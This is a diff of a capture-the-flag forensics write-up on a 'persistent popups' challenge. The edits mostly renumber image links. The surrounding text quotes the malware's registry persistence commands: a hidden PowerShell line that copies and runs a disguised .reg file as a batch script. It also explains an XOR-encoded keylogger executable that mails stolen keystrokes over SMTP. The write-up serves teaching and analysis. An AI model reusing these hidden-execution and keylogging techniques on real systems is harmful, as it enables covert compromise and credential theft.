@@ -23,7 +23,7 @@ The reason we used this file to be able to read the registry keys of the current
 
 Navigating to the specific path of the registry, we locate two very interesting registry keys:  
 
-![alt text](/posts/writeups/trojan2025/persistent-popups/image1.png)  
+![alt text](/posts/writeups/trojan2025/persistent-popups/image2.png)  
 
 The first command is: `cmd.exe /c "powershell -windowstyle hidden $reg = gci -Path C:\ -Recurse *.reg ^| where-object {$_.length -eq 0x00002AE3} ^| select -ExpandProperty FullName -First 1; $bat = "%temp%\tmpreg.bat'; Copy-Item $reg -Destination $bat; ^& $bat;"`  
 The second command is: `cmd /c more +7 %temp%\tmpreg2.bat & %emp%\tmpreg2.bat`  
@@ -34,11 +34,11 @@ Basically, they try to locate a file that has a `.reg` extention and copies some
 
 To do so, we have to navigate to `Tools->File Search by Attributes` and search for `.reg`:  
 
-![alt text](/posts/writeups/trojan2025/persistent-popups/image1.png)  
+![alt text](/posts/writeups/trojan2025/persistent-popups/image3.png)  
 
 Running the following command, we get back only 1 file with a `.reg` extention that also contains very suspicious data:  
 
-![alt text](/posts/writeups/trojan2025/persistent-popups/image1.png)  
+![alt text](/posts/writeups/trojan2025/persistent-popups/image4.png)  
 
 We can right click on the file and extract it for further analysis.
 The data inside the registry file are:  
@@ -69,7 +69,7 @@ rwweχφrwuyyyswvvyrWuvyyqWvveχζrWvve&qwvyfχξΐ
 We notice that the command tries to read the file from a specific offset, then xor with the key `0x77` and then run the result that is stored as an executable.  
 By loading the `.reg` file onto Cyberchef and keeping only the bytes after the `exit`, if we xor with the byte `0x77` we will get the following executable:  
 
-![alt text](/posts/writeups/trojan2025/persistent-popups/image1.png)  
+![alt text](/posts/writeups/trojan2025/persistent-popups/image5.png)  
 
 > Note: Copy and pasting bytes by hand might lead to invalid executable, so make sure to load the `.reg` file itself and then keep only the bytes you want to decrypt.
 
@@ -84,7 +84,7 @@ Opening the file in ILSpy, we get that our program is a Keylogger! What it does 
 
 `smtpClient.Credentials = new NetworkCredential("cafim30443234@arinuse.com", "VHJvamFuezNtYjNkZDFuZ19rM3lsMGdnMzI1X3QwX3IzZ2YxbDM1fQ==");`
 
-![alt text](/posts/writeups/trojan2025/persistent-popups/image1.png)  
+![alt text](/posts/writeups/trojan2025/persistent-popups/image6.png)  
 
 The password part seems kinda sus, so by decoding from base64, we finally get our flag!  
 ```python
